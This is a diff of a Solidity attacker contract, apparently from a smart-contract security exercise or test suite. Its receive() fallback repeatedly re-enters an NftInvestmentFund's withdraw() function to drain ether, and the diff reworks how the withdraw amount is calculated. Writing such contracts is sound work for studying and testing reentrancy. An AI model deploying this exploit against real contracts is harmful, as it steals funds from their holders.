@@ -7,7 +7,6 @@ import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
 
 contract MallorysMaliciousMisappropriation is Ownable {
 	NftInvestmentFund public nftInvestmentFund;
-	uint256 private tokenCount;
 
 	error InvestmentFundNotEnded();
 	error FailedToSendEther();
@@ -19,8 +18,11 @@ contract MallorysMaliciousMisappropriation is Ownable {
 	// Receive is called when the contract receives Ether
 	// solhint-disable-next-line no-complex-fallback
 	receive() external payable {
+		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
+		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) *
+			fundToken.balanceOf(address(this));
+
 		// The attack
-		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) * tokenCount;
 		if (address(nftInvestmentFund).balance >= withdrawAmount) {
 			nftInvestmentFund.withdraw();
 		}
@@ -30,8 +32,7 @@ contract MallorysMaliciousMisappropriation is Ownable {
 		if (!nftInvestmentFund.ended()) revert InvestmentFundNotEnded();
 
 		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
-		tokenCount = fundToken.balanceOf(address(this));
-		fundToken.approve(address(nftInvestmentFund), tokenCount);
+		fundToken.approve(address(nftInvestmentFund), fundToken.balanceOf(address(this)));
 
 		nftInvestmentFund.withdraw();
 	}
